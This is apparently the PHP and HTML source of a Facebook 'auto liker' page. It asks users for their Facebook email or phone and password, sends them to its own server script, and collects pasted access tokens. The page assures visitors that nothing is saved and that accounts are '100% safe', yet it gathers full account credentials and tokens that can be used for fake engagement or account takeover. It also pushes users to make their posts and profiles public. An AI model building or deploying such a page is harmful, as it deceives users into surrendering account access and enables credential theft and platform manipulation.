
<?php 
include 'header.php';?>

<div class="modal" id="myModal"> <div class="modal-dialog"> <div class="modal-content"> 	<div class="modal-header"> 		
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="memberModalLabel">Settings <small>before generating token</small></h4> 	</div></br>
<div class="container">
<div class="alert alert-danger" role="alert"><i class="fa fa-info-circle" aria-hidden="true"></i><b> Be aware to use other fake facebook auto liker websites, because Facebook will lock 🔒 your account, make sure to use our safe website Which we provide guarantees that your account will be %100 safe.</b></div></div> 		<ol><li>Use Auto liker on which Browser you regularly to login Facebook</li><li><b style="color:red">Before Use This App <a href="https://fb.com/" target="_blank"> <button type="submit" class="btn btn-primary btn-xs"><i class="fa fa-link"></i> Login Facebook</button></a> On This same Browser, It's compulsory.</b>Complete 100% your account settings, we means <b style="color:red">add email, add a phone number, add trusted contact</b>, <b>need a profile picture, need a cover picture, need 5+ friends, need 5+ post</b>.</li><li>Don't Share This Access Token To other and Don't use multiple auto liker website on one time.</li><li>To Protect Account Blocking Please Use App Password. To Generate App Password <a href="https://m.facebook.com/new_sec_settings/app_passwords/?step=generate" target="_blank"><button type="submit" class="btn btn-success btn-xs"><i class="fa fa-link"></i> Click Here</button></a> .</li>
</ol>
<div class="modal-footer">
        <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
      </div> </div> </div></div>

<script type="text/javascript"> $(document).ready(function(){ $("#myModal").modal();});</script>

<div class="alert alert-warning" role="alert">	 	<i class="fa fa-info-circle" aria-hidden="true"></i>	 	<b> Make Sure That You Already Logged In Your Facebook Account In This Browser, So Facebook Will Not Force You To Change Password Or Security Check.</b>	 </div>

<div class="panel panel-custom-horrible-seagreen">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fa fa-address-card"></i> Token Tool</div>
      <div class="panel-body"><center><font color="green"><b>Don't Worry, We Never Save Your Account Info.</b> This Token Tool Only Connect You To Get API From Direct Facebook. Use This Token & Feel The Awesomeness of AutoFbTools.</font></center><br>
<div class="form-group" align="center">
<label>*Email or Phone No</label>
<input id="u" placeholder="Enter Your FB Email or Phone No Here" class="form-control"/>
</div>
<div class="form-group" align="center">
<label> *Password</label>
<input type="password" id="p" placeholder="Enter Your Password Here" class="form-control"/>
</div><br>
<div class="form-group">
<button class="btn btn-info form-control" id="submit" onclick="get()"> GET TOKEN </button>
<div class="botboss_load" align="center" style="display:none" >
    <img src="/loading.gif" alt="Please Wait...">
</div><br><br><hr>
<p id="return"></p>
</div></div></div>

<div class="panel panel-custom-horrible-lime">
<div class="panel-heading"><h3 class="panel-title"><i class="fa fa-tasks"></i> Input Token For Login AutoFbTools</h3></div>
<div class="panel-body" align="center">
<b>Post Privacy:</b>  Make sure your "Post privacy" is set to "Public", otherwise AutoFbTools will not work on that post. <br> </p>

<p style="margin:3px;margin-top:8px;" class="center-align black-text">
<b>Account Settings:</b> Make sure you have enabled <a target="_blank" href="https://facebook.com/settings/subscribe"><b> Followers </b></a> on your account and set "Who can comment on your public posts?" <br> and "Who can like or comment on your public profile pictures and other profile info?" to "Public". </p>
<br><br>
<form method="post" action="login.php">
<font color = "red">Please Solve Captcha</font><br>
<div style="margin: 6px;margin-top: 10px;"><img src="captcha.php" alt="Refresh Page." width="102" height="32"/></div>
<input name="captcha" type="tel" pattern=".{4,}" title="4 Characters Minimum" maxlength="6" style="text-align:center;border-bottom: 1px solid #0095e8;border-top: 1px solid #0095e8;margin-top: -2px;width:96%;margin-left:2%;margin-right:2%;color:#040404;" class="form-control" placeholder="Please Enter The CAPTCHA Code" autocomplete="off" required>
      <input type="text" name="access_token" class="form-control" placeholder="Enter Your Access Token Here" style="text-align:center;margin-top: 9px;" autocomplete="off" minlength="100" required>


<input type="hidden" name="submit">
<button style="width:100%;text-align:center;background-color:#0095e8;font-size:110%;box-shadow:0 0 0 0;margin-top: 13px;" type="submit" class="btn btn-info btn-block"> SUBMIT </button> 
</form>
</div>
<div class="panel-footer" align="center"><font color= "green"><small>By Clicking Submit You Are Agree 2 Our Terms Of Service</small></font>
</div>
</div>



  <?php 
      include 'moon.php';?>


<script type="text/javascript">
$(document).ready(function(){
    $('.botboss_load').hide();
    $("#submit").click(function(){
        var d = $('form').serialize();
        $('.botboss_load').show();
        $.get('iphone.php',d,function(data){
        $('.botboss_load').hide();
            
        });
    });
});
 </script>

<script language="javascript">
function get() {
if(!$('#u').val()) {
alert("You Have To Enter Your Facebook Email or Facebook Associate Phone Number First.");
}else if(!$('#p').val()) {
alert("You Have To Enter Your Facebook Password");
}else {
gettoken();
}
}

   function gettoken(){
      $('#get').html('<i class="fa fa-spinner fa-spin"></i> Processing');
                $.ajax({
                    url : "android.php",
                    type : "post",
                    dateType:"text",
                    data : {
                         u : $('#u').val(), p : $('#p').val()
                    },
                    success : function (result){
                        $('#return').html(result);
                    }
                });
            }
</script>
</div></div></div>
</body>
</html>



<?php include 'footer.php'; ?>